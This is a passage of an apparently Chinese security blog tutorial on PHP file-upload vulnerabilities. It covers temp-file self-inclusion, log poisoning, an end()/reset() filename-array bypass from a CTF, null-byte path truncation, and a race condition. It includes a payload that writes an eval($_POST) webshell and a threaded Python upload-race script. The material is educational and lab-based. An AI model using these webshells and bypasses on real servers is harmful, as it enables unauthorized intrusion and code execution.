class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>].<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span>.(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]/<span class="number">1024</span>).<span class="string">&#x27; KB&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>上传以后可以看到，tmp_name的命名规则是php[0-9A-Za-z]{3,4}，而且在上传过程中是被临时存储在&#x2F;tmp目录下（wamp的环境）下。</p><p><img src="image-20210214005327863.png" alt="image-20210214005327863"></p><p>但是上传完成以后文件会自动被删除，所以在&#x2F;tmp下找不到这个文件</p><p>那么我们要如何做到让阻止他将临时文件删除呢？这里就用到了自包含的特性，让存在php文件包含点的文件包含自己，让他产生一个相当于死循环的状态，在包含的过程中我们进行post文件上传操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self_include.php?c=self_include.php</span><br></pre></td></tr></table></figure><p>这样就会导致内存溢出，无法正常结束一个php上传周期，这时它会清空自己的内存堆栈，以便从错误中恢复过来，这时对临时文件的删除操作就无法完成，当跳出这个周期后，这个临时文件就以后缀名为tmp的形式保存在&#x2F;tmp目录下。</p><p>这时候我们就利用存在包含点的php文件包含这个临时文件就行了。</p><p><strong>栗子</strong></p><p>测试环境：apache 2.4.9、php版本5.5.12</p><p>1.创建两个文件，一个为存在包含点的self_include.php，一个构造的文件上传点</p><p>self_include.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>self_include.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;./self_include.php?c=self_include.php&quot;</span>&gt;</span></span><br><span class="line">        File: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.我们让他自包含和文件上传同时进行，这里上传一个phpinfo文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>当我们点击提交以后，发现他报错了</p><blockquote><p>Maximum function nesting level of ‘100’ reached, aborting!</p></blockquote><p><img src="image-20210214005948539.png" alt="image-20210214005948539"></p><p>这是因为在我本地装了xdebug插件，它默认只能trace 100条的信息，所以这里在php.ini的xdebug配置下加上一条：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.max_nesting_level=600</span><br></pre></td></tr></table></figure><p>这里测试过大约包含到150次左右程序就会崩溃，就会在tmp目录下生成我们需要的临时文件。</p><p>3.重启服务器，此时重新包含一次，提交</p><p><img src="image-20210214010026619.png" alt="image-20210214010026619"></p><p>可以看到这里生成了两个临时文件，说明这里经过了两个上传周期，之后php守护进程无法处理这种情况就会抛出一个无法访问异常。</p><p>4.之后就可以直接利用包含点，愉快的包含我们上传的文件了</p><p><img src="image-20210214010112458.png" alt="image-20210214010112458"></p><p>而在实战中不一定能知道文件存储路径，所以就需要目录遍历漏洞来找到临时文件的文件名</p><p>亦或者是知道路径，但不知道文件名，可以使用burp爆破出文件名。</p><p>在Windows下，由于FindFirstFile的特性，在不确定文件后面字符的情况下，可以使用&lt;&lt;结尾来匹配到这个文件，类似于*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/upload/self_include.php?c=../tmp/php&lt;&lt;</span><br></pre></td></tr></table></figure><p><img src="image-20210214010543071.png" alt="image-20210214010543071"></p><p><strong>举一反三之包含日志</strong></p><p>访问一个不存在的文件时，会在服务器下的&#x2F;log&#x2F;access.log进行记录，我们可以通过url写入一个一句话来包含日志文件，从而getshell。</p><p>1.首先访问<a href="http://localhost:9000/">http://localhost:9000/</a><?php phpinfo();?>，记得这里需要使用bp来发包。</p><p><img src="image-20210214010723042.png" alt="image-20210214010723042"></p><ol start="2"><li>可以看到access.log文件记录下了我们访问的url。</li></ol><p><img src="image-20210214010744926.png" alt="image-20210214010744926"></p><ol start="3"><li>进行文件包含，成功包含了phpinfo文件。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/upload/self_include.php?c=../logs/access.log</span><br></pre></td></tr></table></figure><p><img src="image-20210214010831567.png" alt="image-20210214010831567"></p><p><strong>ctf题目</strong></p><p>题目链接：<a href="https://www.ichunqiu.com/battalion?t=1&r=56951">https://www.ichunqiu.com/battalion?t=1&amp;r=56951</a></p><p>writeup链接：<a href="https://blog.csdn.net/qq_30123355/article/details/58165038">https://blog.csdn.net/qq_30123355/article/details/58165038</a></p><h5 id="3-反序列化上传"><a href="#3-反序列化上传" class="headerlink" title="3.反序列化上传"></a>3.反序列化上传</h5><p>这个也是来源于一道 ctf（jarvisoj phpinfo），题目地址</p><p><a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p><p>附上详细的解答：</p><p><a href="https://blog.csdn.net/wy_97/article/details/78430690">https://blog.csdn.net/wy_97/article/details/78430690</a></p><h5 id="4-end函数缺陷"><a href="#4-end函数缺陷" class="headerlink" title="4.end函数缺陷"></a>4.end函数缺陷</h5><p><strong>原理</strong></p><p>end 函数原本的作用就是返回数组的最后一个元素，reset函数返回数组的第一个值。但是呢</p><p>end 函数取到的是给数组的最后一次赋值的那个值，reset 函数取的是第一个给数组赋值的值</p><p><img src="image-20210214013307015.png" alt="image-20210214013307015"></p><p><strong>栗子</strong></p><p>一道网鼎杯第二场的 wafUpload</p><p>先看一下 wafUpload 这道题：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">#$sandbox = &#x27;/var/www/html/upload/&#x27; . md5(&quot;phpIsBest&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span></span><br><span class="line"><span class="meta">$sandbox = &#x27;&#x27;;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">#@chdir($sandbox);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if (!empty($_FILES[&#x27;file&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">    #mime check</span></span><br><span class="line"><span class="meta">    if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&#x27;image/jpeg&#x27;, &#x27;image/png&#x27;, &#x27;image/gif&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">        die(&#x27;This type is not allowed!&#x27;);</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        echo &quot;pass 1n&quot;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    #check filename</span></span><br><span class="line"><span class="meta">    $file = empty($_POST[&#x27;filename&#x27;]) ? $_FILES[&#x27;file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;filename&#x27;];</span></span><br><span class="line"><span class="meta">    if (!is_array($file)) &#123;</span></span><br><span class="line"><span class="meta">        $file = explode(&#x27;.&#x27;, strtolower($file));</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">    $ext = end($file);</span></span><br><span class="line"><span class="meta">    if (!in_array($ext, [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">        die(&#x27;This file is not allowed!&#x27;);</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        echo &quot;pass 2n&quot;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    $filename = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span></span><br><span class="line"><span class="meta">    if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $sandbox . &#x27;/&#x27; . $filename)) &#123;</span></span><br><span class="line"><span class="meta">        echo &#x27;Success!&#x27;;</span></span><br><span class="line"><span class="meta">        echo &#x27;filepath:&#x27; . $sandbox . &#x27;/&#x27; . $filename;</span></span><br><span class="line"><span class="meta">    &#125; else &#123;</span></span><br><span class="line"><span class="meta">        echo &#x27;Failed!&#x27;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">show_source(__file__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Your Shell<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p><p>根据题目，需要绕过两层判断。</p><p>1.第一层，直接抓包修改 MIME 为 image&#x2F;png 就行了。</p><p>2.第二层，构造 filename 字段为数组</p><p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值（这个就有点类似提示的作用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;filename&#x27;]) ? $_FILES[&#x27;file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;filename&#x27;];</span><br></pre></td></tr></table></figure><p>在本地复现一下，抓包之后看看：</p><p>抓包重放之后，如果这里 filename 字段我们填上 shell.php ，根据上面的那句代码的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &#x27;shell.php&#x27;</span><br></pre></td></tr></table></figure><p>如果没有在 filename 字段中填入 shell.php 的话，那么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &#x27;1.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210214014326613.png" alt="image-20210214014326613"></p><p>若直接是这样的话，在下面的几句判断中就无法通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!in_array($ext, [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;]))</span><br></pre></td></tr></table></figure><p>所以这里想要绕过他的判断直接上传 php 文件的话，只能构造 filename 为数组，通过 end 函数的缺陷来绕过下面的的条件判断。</p><p>这里的 end 函数取到了第二个给数组赋值的值，也就是 filename[0] ，reset 函数的值为 filename[1]。这边构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename[1] = php</span><br><span class="line">filename[0] = png</span><br></pre></td></tr></table></figure><p>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure><p>这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file[count($file) - 1]</span><br></pre></td></tr></table></figure><p>一定是取到 filename[1]，所以上面给 filename[1] 赋值为 php 的意义就在这里。</p><p>最后拼接出了 php.php，就达到了上传 shell 的目的.</p><h3 id="5-服务端目录路径校验"><a href="#5-服务端目录路径校验" class="headerlink" title="5.服务端目录路径校验"></a>5.服务端目录路径校验</h3><p><strong>原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p>存在path参数可控，配合<strong>web服务器解析漏洞</strong>上传webshell</p><p>00截断：</p><p> <code>GET:/upload/1.php%001.jpg</code><br><code>POST:在文件名后burpsuite添加二进制00</code></p><p>适用场合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include(require)</span><br><span class="line">file_get_contents</span><br><span class="line">file_exists</span><br><span class="line">所有url中参数可以用%00控制</span><br></pre></td></tr></table></figure><h3 id="6-条件竞争"><a href="#6-条件竞争" class="headerlink" title="6.条件竞争"></a>6.条件竞争</h3><p>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>服务端校验代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success.file path is: &quot;</span>.<span class="variable">$newfile</span>.<span class="string">&quot;\n&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#x27;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#x27;); ?&gt;Copy</span><br></pre></td></tr></table></figure><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RaceCondition</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">&quot;http://127.0.0.1:8080/upload/shell0.php&quot;</span></span><br><span class="line">        self.uploadUrl = <span class="string">&quot;http://127.0.0.1:8080/upload/copy.php&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]create file info.php success&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_upload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;upload file.....&quot;</span>)</span><br><span class="line">        file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;shell0.php&quot;</span>,<span class="string">&quot;r&quot;</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>关于这方面在ctf中比较常见，参考：<a href="https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app">https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app</a></p><h2 id="3-cms、编辑器漏洞"><a href="#3-cms、编辑器漏洞" class="headerlink" title="3.cms、编辑器漏洞"></a>3.cms、编辑器漏洞</h2><h3 id="1-CMS漏洞"><a href="#1-CMS漏洞" class="headerlink" title="1.CMS漏洞"></a>1.CMS漏洞</h3><p>针对不同CMS存在的上传漏洞进行绕过，这个体现出前期信息收集的重要性了，得到各种信息后百度谷歌相应的漏洞。</p><h3 id="2-编辑器漏洞"><a href="#2-编辑器漏洞" class="headerlink" title="2.编辑器漏洞"></a>2.编辑器漏洞</h3><p>比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</p><p><img src="image-20210210180736302.png" alt="image-20210210180736302"></p><p>还可参考：<a href="https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/">https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/</a></p><h2 id="4-bypassWAF"><a href="#4-bypassWAF" class="headerlink" title="4.bypassWAF"></a>4.bypassWAF</h2><p><strong>前言</strong></p><p>一般bypasswaf有四个方面</p><ul><li>从架构层Bypass WAF 。</li><li>从资源限角度bypass WAF。</li><li>从协议层面bypass WAF。</li><li>从规则缺陷bypass WAF。</li></ul><p>但是就文件上传来说，本人目前还没有深入到怎样从架构或者资源层面绕过waf，所以本文均从协议、规则层面来绕过waf。有关bypasswaf的具体详情参考：<a 